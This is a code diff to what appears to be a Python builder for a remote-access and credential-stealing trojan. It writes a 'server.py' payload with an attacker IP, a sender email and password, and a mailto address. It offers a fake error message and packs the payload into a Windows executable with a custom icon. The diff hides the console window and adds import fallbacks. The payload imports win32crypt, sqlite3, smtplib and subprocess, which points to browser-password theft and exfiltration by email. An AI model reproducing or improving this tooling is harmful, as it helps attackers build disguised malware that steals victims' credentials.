@@ -2,8 +2,12 @@
 #Contains test code to be cleaned up
 #To activate Fake Error Message uncomment line 14
 #To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEText import MIMEText
+try:
+	from email.MIMEMultipart import MIMEMultipart
+	from email.MIMEText import MIMEText
+except:
+	from email.mime.multipart import MIMEMultipart
+	from email.mime.text import MIMEText
 import smtplib
 import os, socket
 import sys
@@ -81,7 +85,7 @@ def py2crypt():
     sys.argv.append("py2exe")
     setup(
         options = {'py2exe': {'bundle_files': 1}},
-        console = [{'script': "server.py",
+        windows = [{'script': "server.py",
                     "icon_resources": [(0, "icon.ico")]}],
         zipfile = None,
         )
@@ -98,21 +102,25 @@ def py2crypt():
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 110
+        i = 114
         f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' + '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd +'\''+ '\n'+'mailto = ' + '\''+mailto +'\'' +'\n'+'error = ' + '\''+error +'\''+'\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
             i = i+1
     py2crypt()
-    os.remove('server.py')
+    #os.remove('server.py')
     done()
 
 """
 # -*- coding: cp1250 -*-
 import ctypes
+try:
+	from email.MIMEMultipart import MIMEMultipart
+	from email.MIMEText import MIMEText
+except:
+	from email.mime.multipart import MIMEMultipart
+	from email.mime.text import MIMEText
 import smtplib
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEText import MIMEText
 import os, sys, cgi, py2exe, BaseHTTPServer, sqlite3, win32crypt
 import requests
 import subprocess
